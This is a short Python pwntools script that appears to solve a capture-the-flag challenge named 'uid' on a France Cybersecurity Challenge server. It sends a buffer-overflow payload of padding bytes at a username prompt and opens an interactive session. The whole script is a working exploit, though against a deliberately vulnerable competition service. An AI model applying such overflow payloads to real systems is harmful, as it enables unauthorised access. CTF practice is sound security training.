#! /usr/bin/env python3
from pwn import *

s = remote('challenges.france-cybersecurity-challenge.fr',port=2100)

#p = s.process('./uid')

#recupere l'adresse leak du buffer 
s.recvuntil('username: ', drop=True)

payload = 'A'*56 + '\x00'*100
s.sendline(payload) 
s.interactive()
s.close()
s.close()
